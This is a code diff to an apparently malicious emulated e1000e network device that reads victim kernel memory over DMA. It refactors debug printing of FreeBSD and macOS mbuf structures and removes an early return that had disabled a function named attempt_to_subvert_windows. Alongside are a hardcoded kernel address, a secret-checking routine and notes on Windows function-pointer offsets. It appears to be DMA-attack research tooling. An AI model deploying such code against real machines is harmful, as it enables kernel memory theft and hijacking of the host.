@@ -3695,9 +3695,8 @@ mbuf_cpu_to_le(struct mbuf *mbuf)
 
 #ifndef VICTIM_MACOS
 void
-print_freebsd_mbuf_information(const uint8_t* buffer)
+print_freebsd_mbuf_information(const struct mbuf *mbuf)
 {
-	struct mbuf *mbuf = (struct mbuf *)buffer;
 	printf("m_next: %p.\n", mbuf->m_next);
 	printf("m_nextpkt: %p.\n", mbuf->m_nextpkt);
 	printf("m_data: %p.\n", mbuf->m_data);
@@ -3740,35 +3739,19 @@ print_buffer_address_information(hwaddr ba, void *opaque)
 	struct mbuf mbuf_buffer;
 
 	printf("Buffer: 0x%lx.\n", ba);
-#ifdef VICTIM_MACOS
 	if (ba % 2048 == 0) {
 		printf("Address is 2K aligned. Probably cluster.");
 	} else {
 		pci_dma_read(core->owner, ba & ~0xFF, (uint8_t *)(&mbuf_buffer),
 			sizeof(struct mbuf));
 		mbuf_le_to_cpu(&mbuf_buffer);
+#ifdef VICTIM_MACOS
 		print_macos_mbuf_header(&mbuf_buffer);
+#else
+		print_freebsd_mbuf_information(&mbuf_buffer);
+#endif
 	}
 	hexdump((uint8_t *)(&mbuf_buffer), 256);
-	putchar('\n');
-#else
-	if (ba % 2048 == 0) {
-		printf(" Address is 2K aligned. Probably a cluster.");
-	} else {
-		if ((ba - 0x20) % 256 == 0) {
-			printf(" Address is MHSIZE offset from 256 aligned. Probably "
-				"mbuf without packet header.");
-		} else if ((ba - 0x58) % 256 == 0) {
-			printf(" Address is MPKTHSIZE offset from 256 aligned. Probably "
-				"mbuf with packet header.");
-		}
-		putchar('\n');
-		pci_dma_read(core->owner, ba & ~0xFF, mbuf_buffer, sizeof(struct mbuf));
-		mbuf_le_to_cpu(mbuf_buffer);
-		print_freebsd_mbuf_information(mbuf_buffer);
-	}
-	putchar('\n');
-#endif
 }
 
 SLIST_HEAD(PageListHead, PageListEntry) page_list_head
@@ -3832,7 +3815,6 @@ check_for_secret(uint64_t page_address, uint8_t page[4096])
 void
 record_windows_from_buffer_address(hwaddr ba, void *opaque)
 {
-#ifdef VICTIM_MACOS
 	E1000ECore *core = (E1000ECore *)opaque;
 	struct mbuf mbuf_buffer;
 	struct PageListEntry *entry, *next;
@@ -3880,9 +3862,6 @@ record_windows_from_buffer_address(hwaddr ba, void *opaque)
 			free(entry);
 		}
 	}
-#else
-#error "Recording mbuf based information only supported on MACOS."
-#endif
 }
 
 const void *KERNEL_PRINTF_ADDR = 	(void *)0xffffffff80a4da90ll;
@@ -3999,8 +3978,6 @@ print_page(E1000ECore* core, hwaddr ba)
 void
 attempt_to_subvert_windows(E1000ECore* core, hwaddr ba)
 {
-	print_page(core, ba);
-	return;
 	/* Emprically detirmined by atm26:
 	 * - NET_BUFFER_LIST at ffffb08618300030
 	 * - function pointer at +0x50
